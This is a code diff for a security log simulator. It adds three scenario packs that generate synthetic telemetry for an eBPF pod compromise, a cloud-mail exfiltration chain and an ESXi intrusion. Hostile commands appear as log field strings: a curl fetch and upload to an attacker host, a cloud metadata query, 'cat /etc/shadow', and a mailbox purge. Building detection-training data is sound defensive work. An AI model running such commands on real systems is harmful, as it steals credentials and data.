@@ -29,6 +29,7 @@ try:
     from netspout_core.models import LogEntry, Node, NodeType
     from netspout_core.wave1_authentic_engine import Wave1AuthenticEngine as W1
     from netspout_core.wave2_authentic_engine import Wave2AuthenticEngine as W2
+    from netspout_core.wave3_authentic_engine import Wave3AuthenticEngine as W3
 except ImportError:  # pragma: no cover
     try:
         from app.models import LogEntry, Node, NodeType
@@ -36,6 +37,7 @@ except ImportError:  # pragma: no cover
         from models import LogEntry, Node, NodeType
     from wave1_authentic_engine import Wave1AuthenticEngine as W1
     from wave2_authentic_engine import Wave2AuthenticEngine as W2
+    from wave3_authentic_engine import Wave3AuthenticEngine as W3
 
 
 SCENARIO_PACK_IDS = [
@@ -47,6 +49,9 @@ SCENARIO_PACK_IDS = [
     "wave2_k8s_container_escape",
     "wave2_c2_callback_detection",
     "wave2_bigip_openconfig_itops",
+    "wave3_ebpf_workload_hunt",
+    "wave3_cloudmail_exfil",
+    "wave3_vsphere_hostpath_triage",
 ]
 
 
@@ -115,6 +120,12 @@ def run_scenario_pack(scenario_id: str, run_id: Optional[str] = None,
         return _c2_callback(run_id, source_ip)
     if scenario_id == "wave2_bigip_openconfig_itops":
         return _itops_window(run_id, source_ip)
+    if scenario_id == "wave3_ebpf_workload_hunt":
+        return _ebpf_workload_hunt(run_id, source_ip)
+    if scenario_id == "wave3_cloudmail_exfil":
+        return _cloudmail_exfil(run_id, source_ip)
+    if scenario_id == "wave3_vsphere_hostpath_triage":
+        return _vsphere_hostpath_triage(run_id, source_ip)
     raise ValueError(f"Unknown Wave-2 scenario pack: {scenario_id}")
 
 
@@ -560,4 +571,248 @@ def _itops_window(run_id: str, attacker: str) -> List[LogEntry]:
         process_args="curl -F file=@invoice_q1.csv https://files.example.com/u",
         status="breached"))
     secs.extend(_tag(dr, run_id, "wave2_bigip_openconfig_itops", "DRIFT"))
+    return secs
+
+
+# ---------------------------------------------------------------------------
+# Wave-3 packs: Splunkbase-scale expansion telemetry sequences
+# ---------------------------------------------------------------------------
+
+def _ebpf_workload_hunt(run_id: str, attacker: str) -> List[LogEntry]:
+    """Tetragon eBPF workload hunt: pod exec -> connect -> edge proxy"""
+    k8s = Node(id="wave3-ebpf-podnode", name="ip-10-0-10-253",
+               type=NodeType.WEB_SERVER, ip_address="10.42.21.7")
+    edge = Node(id="wave3-csl-edge", name="cloudsec-proxy",
+                type=NodeType.SASE_PROXY, ip_address="10.42.21.9")
+    zeek_sensor = Node(id="wave3-zeek-sensor", name="zeek-sensor-01",
+                       type=NodeType.FIREWALL, ip_address="10.42.21.4")
+    secs: List[LogEntry] = []
+
+    base: List[LogEntry] = []
+    base.append(W3.format_cisco_isovalent_log(
+        device=k8s, family="process_exec", src_ip=k8s.ip_address,
+        dest_ip="104.20.23.154",
+        arguments="curl https://example.com/health",
+        status="normal"))
+    base.append(W3.format_zeek_conn_json_log(
+        device=zeek_sensor, family="conn", src_ip=k8s.ip_address,
+        dest_ip="10.42.21.20", dest_port=22, service="ssh",
+        history="ShADadFf", status="normal"))
+    secs.extend(_tag(base if isinstance(base, (list, tuple)) else [base],
+                     run_id, "wave3_ebpf_workload_hunt", "BASELINE"))
+
+    probe: List[LogEntry] = []
+    probe.append(W3.format_cisco_cloud_security_dns_log(
+        device=edge, family="dns_query", src_ip=k8s.ip_address,
+        dest_ip="3.151.127.146", domain="pastebin-pool.com.",
+        categories="Proxy/Anonymizer,Application", status="degraded"))
+    secs.extend(_tag(probe, run_id, "wave3_ebpf_workload_hunt", "DEGRADE"))
+
+    execs: List[LogEntry] = []
+    execs.append(W3.format_cisco_isovalent_log(
+        device=k8s, family="process_exec", src_ip=k8s.ip_address,
+        dest_ip=attacker,
+        arguments="-sS -m 4 https://%s/pool" % attacker,
+        status="breached", action="alerted",
+        sourcetype="cisco:isovalent:processExec"))
+    execs.append(W3.format_cisco_cloud_security_proxy_log(
+        device=edge, family="proxy_http", src_ip=k8s.ip_address,
+        dest_ip=attacker, user_agent="gobuster/3.8.1",
+        url="http://%s/css-4411" % attacker, uri_suffix="css-4411",
+        signature="webrecon", status="breached"))
+    secs.extend(_tag(execs, run_id, "wave3_ebpf_workload_hunt", "FAULT"))
+
+    escape: List[LogEntry] = []
+    escape.append(W3.format_cisco_isovalent_log(
+        device=k8s, family="process_connect", src_ip=k8s.ip_address,
+        dest_ip="169.254.169.254", dest_port=80,
+        arguments="-sS -H \"Metadata: true\" "
+                  "http://169.254.169.254/metadata/instance",
+        status="breached", action="alerted",
+        sourcetype="cisco:isovalent:processConnect"))
+    escape.append(W3.format_zeek_conn_json_log(
+        device=zeek_sensor, family="conn", src_ip=k8s.ip_address,
+        dest_ip=attacker, dest_port=3389, service="rdp",
+        conn_state="S1", history="ShADdF", status="breached"))
+    secs.extend(_tag(escape, run_id, "wave3_ebpf_workload_hunt", "PROPAGATE"))
+
+    icmp_exfil: List[LogEntry] = []
+    icmp_exfil.append(W3.format_cisco_cloud_security_firewall_log(
+        device=edge, family="conn_s2c_icmp", src_ip=k8s.ip_address,
+        dest_ip=attacker, action="ALLOW", signature="icmp-tunnel",
+        status="breached"))
+    secs.extend(_tag(icmp_exfil, run_id, "wave3_ebpf_workload_hunt",
+                     "VALIDATE"))
+
+    forensics: List[LogEntry] = []
+    forensics.append(W3.format_opentelemetry_otlp_log(
+        device=k8s, family="log_record", src_ip=k8s.ip_address,
+        dest_ip="10.42.21.9", body="workload quarantine completed",
+        severity="ALERT", signature="otel-quarantine",
+        status="breached"))
+    forensics.append(W3.format_gcp_audit_log(
+        device=k8s, family="admin_activity", src_ip="10.42.21.2",
+        dest_ip="34.84.0.1", method_name="v1.compute.instances.stop",
+        instance="forensic-rerun", signature="gcp-forensic"))
+    secs.extend(_tag(forensics, run_id, "wave3_ebpf_workload_hunt",
+                     "VALIDATE"))
+    return secs
+
+
+def _cloudmail_exfil(run_id: str, attacker: str) -> List[LogEntry]:
+    """Cloud-mail exfil chain: Duo anomaly -> mail trace -> SaaS egress."""
+    duo = Node(id="wave3-duo-admin", name="duo-admin-console",
+               type=NodeType.WEB_SERVER, ip_address="10.42.31.12")
+    gmail = Node(id="wave3-gmail", name="gsuite-mail",
+                 type=NodeType.WEB_SERVER, ip_address="10.42.31.14")
+    m365 = Node(id="wave3-m365", name="m365-exo",
+                type=NodeType.WEB_SERVER, ip_address="10.42.31.16")
+    zs = Node(id="wave3-zs", name="zscaler-edge",
+              type=NodeType.SASE_PROXY, ip_address="10.42.31.18")
+    cf = Node(id="wave3-cloudfront", name="cloudfront-edge",
+              type=NodeType.SASE_PROXY, ip_address="10.42.31.20")
+    secs: List[LogEntry] = []
+
+    base: List[LogEntry] = []
+    base.append(W3.format_cisco_duo_admin_log(
+        device=duo, family="activity_event", src_ip="10.42.31.120",
+        action_name="admin_login", status="normal"))
+    base.append(W3.format_o365_messagetrace_log(
+        device=m365, family="message_trace", src_ip="10.42.31.16",
+        dest_ip="52.96.0.1", status="normal"))
+    secs.extend(_tag(base, run_id, "wave3_cloudmail_exfil", "BASELINE"))
+
+    recon: List[LogEntry] = []
+    recon.append(W3.format_zscaler_nss_web_log(
+        device=zs, family="web_proxy_allow", src_ip="10.42.31.55",
+        dest_ip="104.20.23.154", url="https://pastebin-pool.com/gh",
+        url_category="Information Technology", status="degraded"))
+    recon.append(W3.format_cisco_duo_admin_log(
+        device=duo, family="admin_action", src_ip=attacker,
+        action_name="policy_download",
+        description={"policies": "BaselineAccess: EX0NPUWQ7DB7KCYDEFV2"},
+        status="degraded", action="alerted"))
+    secs.extend(_tag(recon, run_id, "wave3_cloudmail_exfil", "RECON"))
+
+    exfil: List[LogEntry] = []
+    exfil.append(W3.format_gmail_bigquery_log(
+        device=gmail, family="gmail_message_event",
+        src_ip="10.42.31.14", dest_ip=attacker,
+        recipient="vault-drop@external_test_email.com",
+        subject="Q3 invoice bundle", status="breached",
+        action="alerted"))
+    exfil.append(W3.format_o365_graph_messagetrace_log(
+        device=m365, family="graph_message_trace",
+        src_ip="10.42.31.16", dest_ip=attacker,
+        recipient="vault-drop@external_test_email.com",
+        subject="Q3 invoice bundle", status="breached",
+        action="alerted"))
+    exfil.append(W3.format_aws_cloudfront_log(
+        device=cf, family="edge_access", src_ip=attacker,
+        dest_ip="18.244.7.9",
+        origin_host="staging-bucket-812381231.s3.amazonaws.com",
+        signature="exfil-stage", status="breached", action="alerted"))
+    exfil.append(W3.format_aws_cloudtrail_lake_log(
+        device=cf, family="ocsf_api_activity", src_ip=attacker,
+        dest_ip="52.94.76.11",
+        api_operation="CreateAccessKey",
+        request_data='{"userName":"svc-vault"}',
+        response_data='{"accessKey":{"userName":"svc-vault"}}',
+        signature="key-staging", status="breached", action="alerted"))
+    secs.extend(_tag(exfil, run_id, "wave3_cloudmail_exfil", "EXFIL"))
+
+    contain: List[LogEntry] = []
+    contain.append(W3.format_zscaler_nss_web_log(
+        device=zs, family="web_proxy_block", src_ip="10.42.31.55",
+        dest_ip=attacker, url="http://%s/drop/q3.zip" % attacker,
+        url_category="File Sharing", reason="Malicious Bot",
+        status="breached", action="blocked"))
+    contain.append(W3.format_cisco_duo_admin_log(
+        device=duo, family="admin_action", src_ip="10.42.31.120",
+        action_name="policy_bulk_delete",
+        status="breached"))
+    contain.append(W3.format_cisco_ravpn_log(
+        device=zs, family="vpn_auth_reject", src_ip=attacker,
+        dest_ip="10.42.31.18", signature="ravpn-block",
+        status="breached"))
+    secs.extend(_tag(contain, run_id, "wave3_cloudmail_exfil", "CONTAIN"))
+    return secs
+
+
+def _vsphere_hostpath_triage(run_id: str, attacker: str) -> List[LogEntry]:
+    """Hypervisor + identity triage: ESXi shell reads -> SD-WAN mgmt access."""
+    esxi = Node(id="wave3-esxi", name="esxi-host-01",
+                type=NodeType.WEB_SERVER, ip_address="192.168.8.233")
+    lin = Node(id="wave3-vma", name="vma-01",
+               type=NodeType.WEB_SERVER, ip_address="10.42.41.30")
+    sdwan = Node(id="wave3-vsmart", name="vSmart-01",
+                 type=NodeType.ROUTER, ip_address="10.42.41.40")
+    wins = Node(id="wave3-win-system", name="WIN-DC-01",
+                type=NodeType.WEB_SERVER, ip_address="10.42.41.50")
+    dhcp = Node(id="wave3-dhcp", name="dhcp-srv-01",
+                type=NodeType.FIREWALL, ip_address="10.42.41.60")
+    secs: List[LogEntry] = []
+
+    base: List[LogEntry] = []
+    base.append(W3.format_windows_system_xml_log(
+        device=wins, family="system_service_event", src_ip="127.0.0.1",
+        dest_ip=wins.ip_address, event_id=6005,
+        message="The Event log service was started.", status="normal"))
+    base.append(W3.format_cisco_sdwan_syslog_log(
+        device=sdwan, family="vdaemon_control_change",
+        src_ip=sdwan.ip_address, dest_ip="10.42.41.1", status="normal"))
+    base.append(W3.format_dhcpd_log(
+        device=dhcp, family="dhcpack", src_ip=dhcp.ip_address,
+        dest_ip="10.42.41.88", lease_ip="10.42.41.88", status="normal"))
+    secs.extend(_tag(base, run_id, "wave3_vsphere_hostpath_triage",
+                     "BASELINE"))
+
+    fault: List[LogEntry] = []
+    fault.append(W3.format_iis_log(
+        device=wins, family="w3c_access", src_ip="10.42.41.88",
+        dest_ip=wins.ip_address, status="normal"))
+    fault.append(W3.format_vmw_syslog_log(
+        device=esxi, family="shell_command", src_ip=attacker,
+        shell_command="cat /etc/shadow", status="breached",
+        action="alerted"))
+    fault.append(W3.format_linux_secure_log(
+        device=lin, family="su_message", src_ip=esxi.ip_address,
+        dest_ip=lin.ip_address, status="breached", action="alerted"))
+    fault.append(W3.format_linux_secure_log(
+        device=lin, family="pam_session", src_ip=esxi.ip_address,
+        dest_ip=lin.ip_address, status="breached", action="alerted"))
+    fault.append(W3.format_linux_secure_log(
+        device=lin, family="sshd_message", src_ip=attacker,
+        dest_ip=lin.ip_address, signature="linux-ssh", status="breached"))
+    secs.extend(_tag(fault, run_id, "wave3_vsphere_hostpath_triage",
+                     "FAULT"))
+
+    spread: List[LogEntry] = []
+    spread.append(W3.format_cisco_sdwan_access_log(
+        device=sdwan, family="mgmt_proxy_access", src_ip=esxi.ip_address,
+        signature="sdwan-mgmt-probe", status="breached"))
+    spread.append(W3.format_cisco_ios_syslog_log(
+        device=sdwan, family="sec_login_failure", src_ip=esxi.ip_address,
+        reason="BadPassword", localport=22, status="breached",
+        signature="ios-ssh"))
+    spread.append(W3.format_msexchange_log(
+        device=wins, family="cmdlet_event", src_ip=esxi.ip_address,
+        dest_ip=wins.ip_address,
+        cmdlet="Search-Mailbox",
+        cmdlet_params="-Identity \"Helpdesk@corp.local\" "
+                      "-SearchQuery \"Subject:invoice\" "
+                      "-DeleteContent \"True\"",
+        signature="exchange-purge", status="breached"))
+    secs.extend(_tag(spread, run_id, "wave3_vsphere_hostpath_triage",
+                     "PROPAGATE"))
+
+    val: List[LogEntry] = []
+    val.append(W3.format_vmw_syslog_log(
+        device=esxi, family="hostd_event", src_ip="10.42.41.90",
+        status="normal"))
+    val.append(W3.format_cisco_meraki_syslog_log(
+        device=esxi, family="urls", src_ip="10.42.41.88",
+        dest_ip="104.20.23.154", status="normal"))
+    secs.extend(_tag(val, run_id, "wave3_vsphere_hostpath_triage",
+                     "VALIDATE"))
     return secs
